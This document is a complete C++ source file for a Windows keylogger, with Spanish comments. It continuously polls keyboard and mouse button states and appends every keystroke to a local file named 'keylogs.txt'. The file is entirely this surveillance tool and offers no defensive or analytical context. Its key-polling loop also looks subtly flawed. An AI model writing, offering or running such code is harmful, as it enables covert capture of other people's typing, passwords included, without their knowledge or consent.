#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

using namespace std;

// Definición de constantes
const int MIN_KEY_CODE = 8;
const int MAX_KEY_CODE = 190;

const string SPACE_KEY = " ";
const string RETURN_KEY = "\n";
const string SHIFT_KEY = " *SHIFT* ";
const string BACKSPACE_KEY = "\b";
const string RIGHT_CLICK_KEY = " *rclick* ";
const string LEFT_CLICK_KEY = " *lclick* ";

// Crear archivo de registro
ofstream log_file("keylogs.txt", fstream::app);

// Función para escribir en el archivo de registro
void WriteToLog(const string& text) {
    log_file << text;
}

int main()
{
    char pressed_key;
    while (true)
    {
        Sleep(10);
        for (pressed_key = MIN_KEY_CODE; pressed_key <= MAX_KEY_CODE; pressed_key++) {
            // Comprobar si la tecla está presionada
            short key_state = GetKeyState(pressed_key);
            if (key_state == -32767 || key_state == -32768) {
                switch (pressed_key)
                {
                case VK_SPACE:
                    WriteToLog(SPACE_KEY);
                    break;
                case VK_RETURN:
                    WriteToLog(RETURN_KEY);
                    break;
                case VK_SHIFT:
                    WriteToLog(SHIFT_KEY);
                    break;
                case VK_BACK:
                    WriteToLog(BACKSPACE_KEY);
                    break;
                case VK_RBUTTON:
                    WriteToLog(RIGHT_CLICK_KEY);
                    break;
                case VK_LBUTTON:
                    WriteToLog(LEFT_CLICK_KEY);
                    break;
                default:
                    // Si la tecla no está en la lista, escribir en el archivo de registro
                    log_file << pressed_key;
                    break;
                }
            }
        }
    }

    // Cerrar el archivo de registro
    log_file.close();

    return 0;
}